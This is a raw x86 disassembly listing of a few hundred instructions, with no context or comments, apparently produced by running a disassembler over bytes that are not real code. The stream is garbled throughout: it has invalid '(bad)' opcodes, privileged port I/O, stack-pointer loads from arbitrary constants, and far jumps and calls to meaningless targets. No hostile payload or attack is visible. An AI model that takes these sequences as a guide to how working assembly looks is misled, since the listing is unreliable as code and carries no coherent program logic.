  42782c:	xor    BYTE PTR [edi-0x11],0xab
  427830:	test   eax,0x71fb70a3
  427835:	lea    edx,[edi-0x78127880]
  42783b:	adc    eax,0x539b9993
  427840:	push   0xffffff80
  427842:	ja     0x427879
  427844:	or     ch,0x2e
  427847:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  42784d:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  427854:	out    dx,eax
  427855:	and    BYTE PTR [edi-0x7588afdf],0x60
  42785c:	fistp  DWORD PTR [eax-0x21]
  42785f:	adc    DWORD PTR [ebx-0x4a],edx
  427862:	pop    esi
  427863:	xchg   BYTE PTR [edi+0x32532643],cl
  427869:	or     DWORD PTR [esi-0x3e],eax
  42786c:	or     al,0xb2
  42786e:	mov    esp,0x8d4ba229
  427873:	lea    ecx,[ebp+0xc88b2cd]
  427879:	push   ebx
  42787a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42787b:	dec    DWORD PTR [ebx-0x80]
  42787e:	out    0x1d,eax
  427880:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427887:	(bad)  
  427888:	xlat   BYTE PTR ds:[ebx]
  427889:	or     DWORD PTR [edx-0x54881f31],esp
  42788f:	push   esi
  427890:	sar    ebx,cl
  427892:	adc    al,0x62
  427894:	mov    esi,0x8d8d3a9c
  427899:	adc    BYTE PTR [edi+0x15d78071],0x80
  4278a0:	xchg   edi,eax
  4278a1:	out    dx,eax
  4278a2:	adc    bh,0x21
  4278a5:	adc    BYTE PTR [edi+0x21d780ef],0x80
  4278ac:	out    0xef,eax
  4278ae:	and    BYTE PTR [edi+0x53325321],0xb6
  4278b5:	or     DWORD PTR [esi-0x3e],eax
  4278b8:	or     al,0xb2
  4278ba:	mov    esp,0x8d4ba229
  4278bf:	lea    ecx,[ebp-0x5bac33]
  4278c5:	xchg   esp,eax
  4278c6:	mov    dl,0x88
  4278c8:	or     al,0xff
  4278ca:	dec    ebx
  4278cb:	and    bh,0x71
  4278ce:	and    BYTE PTR [edi-0x7f7daceb],0x77
  4278d5:	jno    0x42792a
  4278d7:	retf   
  4278d8:	xor    al,0x15
  4278db:	or     DWORD PTR [esi-0x54],eax
  4278de:	or     al,0xb2
  4278e0:	test   BYTE PTR [ecx],ch
  4278e2:	push   ebx
  4278e3:	jo     0x4278e4
  4278e5:	retf   
  4278e6:	push   edi
  4278e7:	lea    ecx,[ebp-0x3b4d3273]
  4278ed:	or     al,0xff
  4278ef:	add    BYTE PTR [eax-0x63131089],0x13
  4278f6:	mov    BYTE PTR [eax+0x21d78051],0x80
  4278fd:	out    0x71,eax
  4278ff:	and    BYTE PTR [edi-0x757b12eb],0xed
  427906:	mov    esp,0x29beb28a
  42790b:	push   ebx
  42790c:	jb     0x427965
  42790e:	aad    0x58
  427910:	fist   WORD PTR [ecx]
  427912:	mov    ds:0x438f860b,al
  427917:	mov    es:0xdf58d54b,al
  42791d:	adc    DWORD PTR [edx+0x438f86c6],esp
  427923:	es in  al,dx
  427925:	jl     0x42793a
  427927:	(bad)  
  427928:	(bad)  
  427929:	std    
  42792a:	(bad)  
  42792b:	jle    0x42798b
  42792d:	xchg   BYTE PTR [edi+0x5a22643],cl
  427933:	fstp   DWORD PTR [eax-0x21]
  427936:	adc    DWORD PTR [ebx-0x9],edx
  427939:	mov    ds:0xdf58e8cb,al
  42793e:	adc    edi,edx
  427940:	adc    esp,DWORD PTR [ebx-0x9]
  427943:	xlat   BYTE PTR ds:[ebx]
  427944:	or     DWORD PTR [edx+0x3ca10d57],esp
  42794a:	(bad)  
  42794c:	loope  0x427962
  42794e:	enter  0x25be,0x3a
  427952:	lea    ecx,[ebp-0x7f106880]
  427958:	xlat   BYTE PTR ds:[ebx]
  427959:	and    DWORD PTR [eax-0x187f1059],eax
  42795f:	and    DWORD PTR [ebx+0x32],edx
  427962:	pusha  
  427963:	fistp  DWORD PTR [eax-0x21]
  427966:	adc    DWORD PTR [ebx-0x4a],edx
  427969:	or     DWORD PTR [esi-0x3e],eax
  42796c:	or     al,0xb2
  42796e:	mov    BYTE PTR [ebx+edx*2],cl
  427971:	dec    ebp
  427972:	mov    dl,0xb4
  427974:	sub    DWORD PTR [eax-0x29],edx
  427977:	enter  0x9cff,0x80
  42797b:	out    0xc8,eax
  42797d:	cli    
  42797e:	lea    ecx,[ebp+0x453cd8d]
  427984:	inc    DWORD PTR [esi]
  427986:	and    BYTE PTR [edi+0x50238025],0xa7
  42798d:	xor    ah,BYTE PTR [ebx+0x3]
  427990:	xlat   BYTE PTR ds:[ebx]
  427991:	outs   dx,DWORD PTR ds:[esi]
  427992:	push   ebx
  427993:	jb     0x4279f8
  427995:	pushf  
  427996:	aad    0xb0
  427998:	dec    ebp
  427999:	xlat   BYTE PTR ds:[ebx]
  42799a:	xor    eax,0x4d25d780
  42799f:	xlat   BYTE PTR ds:[ebx]
  4279a0:	sub    eax,0x4d8ad74d
  4279a5:	pop    ecx
  4279a6:	xchg   BYTE PTR [ebx],dh
  4279a8:	dec    ebx
  4279a9:	dec    ebp
  4279aa:	dec    ebp
  4279ab:	push   eax
  4279ac:	outs   dx,DWORD PTR ds:[esi]
  4279ad:	mov    esi,0x8d8d8dfa
  4279b2:	adc    BYTE PTR [edi+0x21e780ef],0x53
  4279b9:	mov    edx,DWORD PTR [ebx-0x4a]
  4279bc:	or     DWORD PTR [esi-0x7b],eax
  4279bf:	or     al,0xb2
  4279c1:	popa   
  4279c2:	or     al,0x50
  4279c4:	out    0xc8,eax
  4279c6:	and    bh,0xef
  4279c9:	and    BYTE PTR [edi+0x29bcb221],0x53
  4279d0:	or     eax,0x53c8d780
  4279d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279d6:	dec    DWORD PTR [ebx-0x80]
  4279d9:	out    0x71,eax
  4279db:	push   ebx
  4279dc:	retf   
  4279dd:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  4279e4:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  4279e9:	adc    BYTE PTR [ecx],0x80
  4279ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279ed:	adc    eax,0xcfd4609
  4279f2:	mov    dl,0xbc
  4279f4:	sub    DWORD PTR [ebx-0x5c],edx
  4279f7:	mov    dl,0xbe
  4279f9:	or     al,0xa2
  4279fb:	dec    ebx
  4279fc:	lea    ecx,[ebp+0x74ffcd8d]
  427a02:	jmp    FWORD PTR [edx]
  427a04:	arpl   di,si
  427a06:	xlat   BYTE PTR ds:[ebx]
  427a07:	sbb    DWORD PTR [ebx+0x5],esp
  427a0a:	xlat   BYTE PTR ds:[ebx]
  427a0b:	nop
  427a0c:	dec    edx
  427a0d:	push   ebx
  427a0e:	test   DWORD PTR [esi],ebx
  427a10:	jne    0x4279d1
  427a12:	push   0xffffffc8
  427a14:	outs   dx,DWORD PTR ds:[esi]
  427a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a16:	jbe    0x427a4c
  427a18:	push   ebx
  427a19:	test   DWORD PTR [esi],ebx
  427a1b:	jne    0x4279e1
  427a1d:	stos   BYTE PTR es:[edi],al
  427a1e:	xor    BYTE PTR [edi-0x11],0x80
  427a22:	lock and DWORD PTR [eax-0x287f1069],eax
  427a29:	and    DWORD PTR [edx+0x438f8605],esp
  427a2f:	es push edi
  427a31:	fistp  DWORD PTR [eax-0x21]
  427a34:	adc    DWORD PTR [ecx],ecx
  427a36:	inc    esi
  427a37:	std    
  427a38:	or     al,0x80
  427a3a:	ret    0x4d53
  427a3d:	push   ebx
  427a3e:	jb     0x4279f2
  427a40:	add    ch,BYTE PTR [ecx]
  427a42:	push   ebx
  427a43:	test   DWORD PTR [edx+0xba20cbe],esi
  427a49:	lea    ecx,[ebp+0x7cffcd8d]
  427a4f:	call   DWORD PTR [ecx+0x5f]
  427a52:	ja     0x4279de
  427a54:	xlat   BYTE PTR ds:[ebx]
  427a55:	out    dx,al
  427a56:	arpl   WORD PTR [esi+0x47a221d5],si
  427a5c:	fisubr WORD PTR [eax+0x2d]
  427a5f:	mov    ds:0xe3bb390a,al
  427a64:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  427a6a:	adc    edx,ebp
  427a6c:	pop    esp
  427a6d:	js     0x427a93
  427a6f:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  427a75:	sub    eax,0x8780978d
  427a7a:	in     eax,dx
  427a7b:	xchg   DWORD PTR [ecx],esp
  427a7d:	xor    BYTE PTR [edi-0x11],0x80
  427a81:	lock and DWORD PTR [ecx],ecx
  427a84:	inc    esi
  427a85:	std    
  427a86:	or     al,0xb2
  427a88:	mov    esi,0xeff0800c
  427a8d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a94:	xor    al,0x1d
  427a97:	cli    
  427a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a99:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427aa0:	(bad)  
  427aa1:	sti    
  427aa2:	push   eax
  427aa3:	cmp    al,BYTE PTR [eax-0x327fda89]
  427aa9:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427ab0:	ja     0x427ad7
  427ab2:	or     ch,0x36
  427ab5:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427abb:	xchg   edx,eax
  427abc:	gs xor al,0x25
  427ac0:	adc    BYTE PTR [eax+0x32],0x3a
  427ac4:	lea    ecx,[ebp-0x1dea8080]
  427aca:	out    dx,al
  427acb:	mov    ebp,0x8d8d818d
  427ad0:	dec    ebp
  427ad1:	push   edx
  427ad2:	or     ch,BYTE PTR [edx-0x73af49b3]
  427ad8:	xor    BYTE PTR [edi-0x11],0x80
  427adc:	lock and DWORD PTR [ecx],ecx
  427adf:	inc    esi
  427ae0:	std    
  427ae1:	or     al,0xb2
  427ae3:	mov    esi,0xeff0800c
  427ae8:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427aef:	cld    
  427af0:	push   ebx
  427af1:	jb     0x427af2
  427af3:	sti    
  427af4:	push   eax
  427af5:	ja     0x427a81
  427af7:	add    DWORD PTR [edi-0x76],esi
  427afa:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427b00:	mov    edx,0x15d74d29
  427b05:	dec    ebp
  427b06:	xlat   BYTE PTR ds:[ebx]
  427b07:	jno    0x427b56
  427b09:	xlat   BYTE PTR ds:[ebx]
  427b0a:	and    DWORD PTR [ebp-0x29],ecx
  427b0d:	out    dx,eax
  427b0e:	xchg   BYTE PTR [ebx],dh
  427b10:	int3   
  427b11:	dec    ebp
  427b12:	dec    ebp
  427b13:	xor    BYTE PTR [edi-0x11],0x80
  427b17:	lock and DWORD PTR [ecx],ecx
  427b1a:	inc    esi
  427b1b:	std    
  427b1c:	or     al,0xb2
  427b1e:	mov    esi,0xeff0800c
  427b23:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427b2a:	mov    dl,0xba
  427b2c:	sub    DWORD PTR [eax+0x63fbff09],eax
  427b32:	std    
  427b33:	aad    0x37
  427b35:	xor    BYTE PTR [edi+0x71],0x80
  427b39:	lock adc eax,0xcfd4609
  427b3f:	mov    dl,0xbe
  427b41:	or     al,0x80
  427b43:	lock jno 0x427ac6
  427b46:	xchg   edi,eax
  427b47:	adc    eax,0x7253fc53
  427b4c:	mov    dl,0xba
  427b4e:	sub    DWORD PTR [eax-0x400e210],eax
  427b54:	or     DWORD PTR [edx],esp
  427b56:	ja     0x427ae2
  427b58:	push   eax
  427b59:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427b5f:	xchg   edi,eax
  427b60:	add    BYTE PTR [edi-0x64666c6a],0x53
  427b67:	push   0xffffff80
  427b69:	xlat   BYTE PTR ds:[ebx]
  427b6a:	cmp    eax,0x80459780
  427b6f:	out    0x25,eax
  427b71:	pop    esi
  427b72:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427b78:	pop    eax
  427b79:	fist   WORD PTR [ecx]
  427b7b:	arpl   di,si
  427b7d:	or     esi,ecx
  427b7f:	dec    esp
  427b80:	lea    ecx,[ebp-0x3960fe73]
  427b86:	in     al,0xee
  427b88:	arpl   si,ax
  427b8a:	(bad)  
  427b8c:	arpl   si,ax
  427b8e:	xlat   BYTE PTR ds:[ebx]
  427b8f:	out    dx,eax
  427b90:	arpl   di,si
  427b92:	or     DWORD PTR [edi],ecx
  427b94:	pop    ss
  427b95:	or     al,0x8d
  427b97:	lea    esp,[edx-0x20a755f3]
  427b9d:	adc    edi,edx
  427b9f:	out    dx,eax
  427ba0:	arpl   di,si
  427ba2:	or     DWORD PTR [edi],ecx
  427ba4:	das    
  427ba5:	or     al,0x8d
  427ba7:	lea    esp,[edx-0x20a766f3]
  427bad:	adc    edi,edx
  427baf:	out    dx,eax
  427bb0:	arpl   di,si
  427bb2:	or     DWORD PTR [edi],ecx
  427bb4:	dec    ebx
  427bb5:	lea    ecx,[ebp-0x56f25d73]
  427bbb:	pop    eax
  427bbc:	fist   WORD PTR [ecx]
  427bbe:	xlat   BYTE PTR ds:[ebx]
  427bbf:	out    dx,al
  427bc0:	arpl   di,si
  427bc2:	aad    0x3f
  427bc4:	mov    ds:0xdf58d00d,al
  427bc9:	adc    edi,edx
  427bcb:	out    dx,eax
  427bcc:	arpl   di,si
  427bce:	or     DWORD PTR [edi],ecx
  427bd0:	mov    al,ds:0xa28d8d3a
  427bd5:	or     eax,0x11df58b9
  427bda:	or     DWORD PTR [edi-0x24],ecx
  427bdd:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427be3:	(bad)  
  427be5:	lea    ecx,[ebp+0x3aa2be8d]
  427beb:	lea    ecx,[ebp+0x4d1dd74d]
  427bf1:	xlat   BYTE PTR ds:[ebx]
  427bf2:	sub    eax,0x4d15d74d
  427bf7:	xlat   BYTE PTR ds:[ebx]
  427bf8:	jno    0x427c47
  427bfa:	xlat   BYTE PTR ds:[ebx]
  427bfb:	and    DWORD PTR [ebp-0x29],ecx
  427bfe:	out    dx,eax
  427bff:	xchg   bl,dl
  427c01:	or     eax,0xb7be4d4d
  427c06:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427c0c:	pop    eax
  427c0d:	fist   WORD PTR [ecx]
  427c0f:	xlat   BYTE PTR ds:[ebx]
  427c10:	out    dx,eax
  427c11:	arpl   di,si
  427c13:	or     DWORD PTR [edi],ecx
  427c15:	loope  0x427ba4
  427c17:	lea    ecx,[ebp+0x58e40da2]
  427c1d:	fist   WORD PTR [ecx]
  427c1f:	xlat   BYTE PTR ds:[ebx]
  427c20:	out    dx,eax
  427c21:	arpl   di,si
  427c23:	or     DWORD PTR [edi],ecx
  427c25:	mov    cl,0x3a
  427c27:	lea    ecx,[ebp+0x58d90da2]
  427c2d:	fist   WORD PTR [ecx]
  427c2f:	xlat   BYTE PTR ds:[ebx]
  427c30:	out    dx,al
  427c31:	arpl   di,si
  427c33:	aad    0x1d
  427c35:	mov    ds:0xdf58e60d,al
  427c3a:	adc    edi,edx
  427c3c:	out    dx,eax
  427c3d:	arpl   di,si
  427c3f:	or     DWORD PTR [edi],ecx
  427c41:	aam    0x3a
  427c43:	lea    ecx,[ebp+0x58e80da2]
  427c49:	fist   WORD PTR [ecx]
  427c4b:	les    eax,FWORD PTR [ecx]
  427c4d:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427c54:	out    0xef,eax
  427c56:	and    BYTE PTR [edi+0x53325321],0xb6
  427c5d:	or     DWORD PTR [esi-0x3e],eax
  427c60:	or     al,0xb2
  427c62:	mov    esp,0x8d4ba229
  427c67:	lea    ecx,[ebp+0xc88b2cd]
  427c6d:	push   ebx
  427c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c6f:	dec    DWORD PTR [ebx-0x80]
  427c72:	out    0xef,eax
  427c74:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427c7b:	adc    eax,esi
  427c7d:	push   eax
  427c7e:	xchg   edi,eax
  427c7f:	out    dx,eax
  427c80:	push   eax
  427c81:	xlat   BYTE PTR ds:[ebx]
  427c82:	and    DWORD PTR [eax-0x287f1069],eax
  427c88:	and    DWORD PTR [eax-0x587f1019],eax
  427c8e:	and    DWORD PTR [ebx+0x32],edx
  427c91:	push   ebx
  427c92:	mov    dh,0x9
  427c94:	inc    esi
  427c95:	ret    0xb20c
  427c98:	mov    esp,0xb2a45329
  427c9d:	mov    BYTE PTR [edx+eiz*4],cl
  427ca0:	dec    ebx
  427ca1:	lea    ecx,[ebp-0x6b003273]
  427ca7:	dec    DWORD PTR [ebx+0x3f]
  427caa:	xchg   edi,eax
  427cab:	jno    0x427ccc
  427cad:	xlat   BYTE PTR ds:[ebx]
  427cae:	adc    eax,0x803d9780
  427cb3:	xlat   BYTE PTR ds:[ebx]
  427cb4:	inc    ebp
  427cb5:	adc    BYTE PTR [edi+0x15d78071],0x80
  427cbc:	xchg   edi,eax
  427cbd:	jno    0x427c3f
  427cbf:	xlat   BYTE PTR ds:[ebx]
  427cc0:	adc    eax,0x8071e780
  427cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cc6:	adc    eax,0xb6533253
  427ccb:	or     DWORD PTR [esi-0x3e],eax
  427cce:	or     al,0xb2
  427cd0:	mov    esp,0xa2a45329
  427cd5:	dec    ebx
  427cd6:	lea    ecx,[ebp-0x774d3273]
  427cdc:	or     al,0xff
  427cde:	dec    ebx
  427cdf:	and    bh,0x3d
  427ce2:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427ce9:	push   ebx
  427cea:	add    BYTE PTR [eax-0xf7fc289],0x45
  427cf1:	or     DWORD PTR [esi-0x54],eax
  427cf4:	or     al,0x53
  427cf6:	jo     0x427caa
  427cf8:	test   BYTE PTR [ecx],ch
  427cfa:	push   edi
  427cfb:	lea    ecx,[ebp-0x34003273]
  427d01:	xor    al,0x71
  427d04:	mov    dl,0xc4
  427d06:	or     al,0xff
  427d08:	sub    ah,0x9c
  427d0b:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427d12:	mov    dh,BYTE PTR [edx+0x6a532988]
  427d18:	mov    ds:0xdf58d505,al
  427d1d:	adc    DWORD PTR [edx+0x438f86c2],esp
  427d23:	es and bh,0x3d
  427d27:	and    BYTE PTR [edi-0x754312bb],0xa2
  427d2e:	dec    ebx
  427d2f:	aad    0x58
  427d31:	fist   WORD PTR [ecx]
  427d33:	mov    ds:0x438f86c6,al
  427d38:	es in  al,dx
  427d3a:	sub    al,BYTE PTR [eax-0x6becda19]
  427d40:	(bad)  
  427d41:	sti    
  427d42:	push   edi
  427d43:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427d49:	add    eax,0x58d90ba2
  427d4e:	fist   WORD PTR [ecx]
  427d50:	cdq    
  427d51:	dec    ebp
  427d52:	xlat   BYTE PTR ds:[ebx]
  427d53:	xor    eax,0x9b2dd74d
  427d58:	dec    ebp
  427d59:	xlat   BYTE PTR ds:[ebx]
  427d5a:	sbb    eax,0x4d15d74d
  427d5f:	xlat   BYTE PTR ds:[ebx]
  427d60:	jno    0x427daf
  427d62:	xlat   BYTE PTR ds:[ebx]
  427d63:	and    DWORD PTR [ebp-0x29],ecx
  427d66:	out    dx,eax
  427d67:	xchg   dh,al
  427d69:	int3   
  427d6a:	dec    ebp
  427d6b:	dec    ebp
  427d6c:	push   eax
  427d6d:	mov    WORD PTR [eax-0x5c565474],es
  427d73:	jo     0x427d70
  427d75:	cmp    eax,0xef97808d
  427d7a:	adc    bh,0x21
  427d7d:	and    bh,0xef
  427d80:	and    BYTE PTR [edi+0x53b65321],0x32
  427d87:	or     DWORD PTR [esi-0x3e],eax
  427d8a:	or     al,0xb2
  427d8c:	mov    esp,0x8d4ba229
  427d91:	lea    ecx,[ebp+0xc88b2cd]
  427d97:	push   ebx
  427d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d99:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427da0:	and    BYTE PTR [edi-0x6300eb],0xc6
  427da7:	push   eax
  427da8:	xchg   edi,eax
  427da9:	jno    0x427dfb
  427dab:	xlat   BYTE PTR ds:[ebx]
  427dac:	adc    eax,0x803d9780
  427db1:	xlat   BYTE PTR ds:[ebx]
  427db2:	inc    ebp
  427db3:	adc    BYTE PTR [edi+0x15d78071],0x80
  427dba:	xchg   edi,eax
  427dbb:	out    dx,eax
  427dbc:	adc    bh,0x21
  427dbf:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427dc6:	out    0xef,eax
  427dc8:	and    BYTE PTR [edi+0x53b65321],0x32
  427dcf:	or     DWORD PTR [esi-0x3e],eax
  427dd2:	or     al,0xb2
  427dd4:	mov    esp,0x8d4ba229
  427dd9:	lea    ecx,[ebp-0x5bac33]
  427ddf:	xchg   esp,eax
  427de0:	mov    dl,0x88
  427de2:	or     al,0xff
  427de4:	dec    ebx
  427de5:	and    bh,0x71
  427de8:	and    BYTE PTR [edi+0x53cb5315],0x82
  427def:	xor    BYTE PTR [edi+0x71],0x80
  427df3:	lock adc eax,0xcac4609
  427df9:	push   ebx
  427dfa:	jo     0x427dfb
  427dfc:	retf   
  427dfd:	mov    dl,0x84
  427dff:	sub    DWORD PTR [edi-0x73],edx
  427e02:	lea    ecx,[ebp+0xcc4b2cd]
  427e08:	inc    DWORD PTR [edx-0x7fc28880]
  427e0e:	lock inc ebp
  427e10:	in     al,dx
  427e11:	pushf  
  427e12:	and    bh,0x3d
  427e15:	adc    eax,esi
  427e17:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427e1e:	inc    ebx
  427e1f:	es push edi
  427e21:	fistp  DWORD PTR [eax-0x21]
  427e24:	adc    DWORD PTR [ecx],ecx
  427e26:	inc    esi
  427e27:	std    
  427e28:	or     al,0xb2
  427e2a:	mov    esp,0xcbeb229
  427e2f:	push   ebx
  427e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e31:	mov    ds:0x8d8d8d4b,al
  427e36:	int    0xff
  427e38:	sub    bh,bh
  427e3a:	je     0x427e28
  427e3c:	not    DWORD PTR [ebx]
  427e3e:	add    eax,0x80eff080
  427e43:	xchg   edi,eax
  427e44:	and    DWORD PTR [eax-0x587f8e19],eax
  427e4a:	adc    eax,0xed8abaed
  427e4f:	mov    esp,0xd505a28a
  427e54:	pop    eax
  427e55:	fist   WORD PTR [ecx]
  427e57:	mov    ds:0xdf58d54b,al
  427e5c:	adc    DWORD PTR [edx+0x6a532988],esi
  427e62:	mov    ds:0x438f86c2,al
  427e67:	mov    es:0x438f86c6,al
  427e6d:	es in  al,dx
  427e6f:	sub    dl,BYTE PTR [ebx]
  427e71:	xchg   esp,eax
  427e72:	mov    esi,0x4d4d0d48
  427e77:	xchg   edi,eax
  427e78:	add    BYTE PTR [edi-0x66e27813],0x60
  427e7f:	fstp   DWORD PTR [eax-0x21]
  427e82:	adc    DWORD PTR [eax-0x10],edx
  427e85:	xor    bl,BYTE PTR [esi-0x7a]
  427e88:	pop    DWORD PTR [ebx+0x26]
  427e8b:	push   eax
  427e8c:	ja     0x427e56
  427e8e:	jl     0x427f07
  427e90:	xchg   ah,ah
  427e92:	pop    eax
  427e93:	fist   WORD PTR [ecx]
  427e95:	push   eax
  427e96:	ja     0x427e1f
  427e98:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e9f:	or     DWORD PTR [esi-0x3e],eax
  427ea2:	or     al,0xb2
  427ea4:	mov    BYTE PTR [eax+eax*4],cl
  427ea7:	xlat   BYTE PTR ds:[ebx]
  427ea8:	xor    al,BYTE PTR [eax-0x5df53719]
  427eae:	ret    0xc7a7
  427eb1:	add    al,0xd4
  427eb3:	push   ebx
  427eb4:	dec    ebp
  427eb5:	xchg   esi,eax
  427eb6:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427ebd:	and    DWORD PTR [eax-0x69],edx
  427ec0:	and    DWORD PTR [ebp-0x29],ecx
  427ec3:	and    DWORD PTR [ecx],eax
  427ec5:	ja     0x427e51
  427ec7:	dec    ebp
  427ec8:	xlat   BYTE PTR ds:[ebx]
  427ec9:	out    dx,eax
  427eca:	mov    dl,0x2
  427ecc:	sub    DWORD PTR [edx],ecx
  427ece:	dec    ebp
  427ecf:	xlat   BYTE PTR ds:[ebx]
  427ed0:	and    DWORD PTR [ebp-0x29],ecx
  427ed3:	xchg   DWORD PTR [ebp-0x29],ecx
  427ed6:	xchg   BYTE PTR [ebp-0x29],cl
  427ed9:	enter  0xd74d,0x32
  427edd:	xchg   bh,ah
  427edf:	mov    cl,BYTE PTR [ebp+0x4d]
  427ee2:	stos   DWORD PTR es:[edi],eax
  427ee3:	push   eax
  427ee4:	ja     0x427e70
  427ee6:	xor    BYTE PTR [edi-0x76],0xa9
  427eea:	jo     0x427ee7
  427eec:	out    dx,eax
  427eed:	lea    edx,[edi-0x6127880]
  427ef3:	mov    ebp,ebp
  427ef5:	xchg   DWORD PTR [ebp-0x67],eax
  427ef8:	jl     0x427f6f
  427efa:	xor    eax,0x8d8d8d35
  427eff:	lea    edi,[ebp+esi*2+0x35]
  427f03:	inc    ebp
  427f04:	lea    ecx,[ebp+0x75018d8d]
  427f0a:	xor    eax,0xd74d0a71
  427f0f:	xor    eax,0x4d2dd74d
  427f14:	xlat   BYTE PTR ds:[ebx]
  427f15:	and    eax,0x4d1dd74d
  427f1a:	xlat   BYTE PTR ds:[ebx]
  427f1b:	adc    eax,0x4d71d74d
  427f20:	xlat   BYTE PTR ds:[ebx]
  427f21:	and    DWORD PTR [ebp-0x29],ecx
  427f24:	out    dx,eax
  427f25:	xchg   cl,bl
  427f27:	mov    eax,0x77804d4d
  427f2c:	out    dx,eax
  427f2d:	push   eax
  427f2e:	jne    0x427f65
  427f30:	out    dx,al
  427f31:	xor    BYTE PTR [ebp+0x35],0x35
  427f35:	dec    edi
  427f36:	push   0x9
  427f38:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427f3f:	xor    eax,0x96a4f45
  427f44:	(bad)  
  427f46:	lea    ecx,[ebp+0x35d54d8d]
  427f4c:	and    eax,0x2535d54d
  427f51:	dec    ebp
  427f52:	aad    0x35
  427f54:	and    eax,0x81357580
  427f59:	dec    ebp
  427f5a:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427f64:	jne    0x427f9b
  427f66:	out    dx,al
  427f67:	add    DWORD PTR [edi-0x12],esi
  427f6a:	push   eax
  427f6b:	jne    0x427fa2
  427f6d:	out    dx,eax
  427f6e:	xor    BYTE PTR [ebp+0x35],0x3d
  427f72:	in     al,dx
  427f73:	jne    0x427faa
  427f75:	out    dx,al
  427f76:	push   eax
  427f77:	jne    0x427fae
  427f79:	out    dx,al
  427f7a:	xor    BYTE PTR [ebp+0x35],0xee
  427f7e:	xor    BYTE PTR [ebp+0x35],0xee
  427f82:	xor    BYTE PTR [ecx],0x35
  427f85:	out    dx,al
  427f86:	adc    BYTE PTR [eax+0x26],0x3a
  427f8a:	lea    ecx,[ebp-0x2a7ff180]
  427f90:	xor    eax,0x2ecd80ef
  427f95:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f9b:	jmp    0x7180:0x8d8d3a16
  427fa2:	add    BYTE PTR [ecx+0x165aa80],0x95
  427fa9:	sbb    DWORD PTR [edx],ecx
  427fab:	sub    BYTE PTR [esi-0x80],0x90
  427faf:	in     al,dx
  427fb0:	jle    0x427f32
  427fb2:	aad    0x35
  427fb4:	out    dx,eax
  427fb5:	pop    edi
  427fb6:	sbb    DWORD PTR [ecx],ecx
  427fb8:	in     eax,dx
  427fb9:	fstp   TBYTE PTR [edx]
  427fbb:	lea    ecx,[ebp-0x10ca6a80]
  427fc1:	sub    BYTE PTR [esi-0x80],0xa6
  427fc5:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427fcc:	or     al,0xbe
  427fce:	sar    BYTE PTR [edx],1
  427fd0:	lea    ecx,[ebp+0x45357580]
  427fd6:	dec    edi
  427fd7:	push   0x9
  427fd9:	dec    edi
  427fda:	cdq    
  427fdb:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427fe1:	out    dx,al
  427fe2:	or     ch,0x2e
  427fe5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427feb:	jne    0x428022
  427fed:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427ff3:	int    0x26
  427ff5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427ffb:	jne    0x428032
  427ffd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  428003:	int    0x10
  428005:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  42800b:	lea    edx,[eax+0x75]
  42800e:	xor    eax,0x35758021
  428013:	out    dx,al
  428014:	or     ch,0x41
  428017:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  42801d:	lea    edx,[eax+0x75]
  428020:	xor    eax,0x35758021
  428025:	out    dx,al
  428026:	xor    BYTE PTR [ecx],0x35
  428029:	out    dx,al
  42802a:	or     ch,0x82
  42802d:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  428033:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  428039:	xor    dl,bh
  42803b:	and    ah,BYTE PTR [edi+ebp*2]
  42803e:	cmp    BYTE PTR [ebx-0x4],dl
  428041:	in     eax,dx
  428042:	add    eax,0xc86b20d
  428047:	mov    dl,0xba
  428049:	sub    edi,edi
  42804b:	std    
  42804c:	push   eax
  42804d:	xor    DWORD PTR ds:0x35757c21,esi
  428053:	out    dx,eax
  428054:	lea    ecx,[ebp+0x75808d8d]
  42805a:	xor    eax,0xd56a4f35
  42805f:	ret    
  428060:	xor    BYTE PTR [ebp+0x35],0x71
  428064:	in     eax,dx
  428065:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  42806b:	push   ebx
